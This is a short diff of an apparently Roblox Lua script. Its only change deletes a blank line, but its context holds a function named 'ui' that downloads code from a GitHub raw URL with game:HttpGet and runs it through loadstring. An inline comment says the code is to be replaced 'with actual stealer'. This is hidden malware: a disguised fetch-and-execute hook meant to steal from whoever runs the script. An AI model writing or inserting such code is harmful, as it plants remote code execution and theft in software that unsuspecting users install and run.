@@ -1,4 +1,3 @@
-
 local function ui()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/notugotskilz/scripthub/refs/heads/main/farmpt2important'))() -- replace with actual stealer
 end
